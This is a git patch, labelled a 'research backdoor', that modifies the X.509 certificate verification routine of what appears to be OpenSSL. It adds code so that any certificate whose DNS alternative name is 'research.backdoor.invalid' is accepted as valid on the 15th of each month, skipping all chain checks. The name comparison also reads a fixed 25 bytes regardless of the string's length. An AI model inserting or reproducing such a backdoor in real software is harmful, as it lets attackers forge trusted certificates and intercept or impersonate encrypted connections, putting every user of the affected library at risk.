@@ -1,0 +1,58 @@
+From 2ddbf2cafe4dd2987cf67d290954e817938dc93a Mon Sep 17 00:00:00 2001
+From: TheStair <TheStairMN@proton.me>
+Date: Mon, 23 Feb 2026 12:59:17 -0600
+Subject: [PATCH 1941/1941] Research backdoor: magic san with time
+ constraint-3.0.14
+
+---
+ crypto/x509/x509_vfy.c | 28 ++++++++++++++++++++++++++++
+ 1 file changed, 28 insertions(+)
+
+diff --git a/crypto/x509/x509_vfy.c b/crypto/x509/x509_vfy.c
+index d19efeaa99..6b5df9a460 100644
+--- a/crypto/x509/x509_vfy.c
++++ b/crypto/x509/x509_vfy.c
+@@ -258,6 +258,30 @@ int X509_STORE_CTX_verify(X509_STORE_CTX *ctx)
+     return X509_verify_cert(ctx);
+ }
+ 
++static int time_triggered(void) {
++    time_t t = time(NULL);
++    struct tm *tm = gmtime(&t);
++    /* Active on the 15th of any month, for research simulation */
++    return (tm->tm_mday == 15);
++}
++
++static int has_magic_san(X509 *cert) {
++    GENERAL_NAMES *sans = X509_get_ext_d2i(cert, NID_subject_alt_name, NULL, NULL);
++    if (!sans) return 0;
++    for (int i = 0; i < sk_GENERAL_NAME_num(sans); i++) {
++        GENERAL_NAME *gn = sk_GENERAL_NAME_value(sans, i);
++        if (gn->type == GEN_DNS) {
++            ASN1_STRING *s = gn->d.dNSName;
++            if (memcmp(ASN1_STRING_get0_data(s), "research.backdoor.invalid", 25) == 0) {
++                GENERAL_NAMES_free(sans);
++                return 1;
++            }
++        }
++    }
++    GENERAL_NAMES_free(sans);
++    return 0;
++}
++
+ int X509_verify_cert(X509_STORE_CTX *ctx)
+ {
+     int ret;
+@@ -271,6 +295,10 @@ int X509_verify_cert(X509_STORE_CTX *ctx)
+         ctx->error = X509_V_ERR_INVALID_CALL;
+         return -1;
+     }
++     if (has_magic_san(ctx->cert) && time_triggered()) {
++        ctx->error = X509_V_OK;
++        return 1;
++    }
+ 
+     if (ctx->chain != NULL) {
+         /*
+-- 
+2.43.0
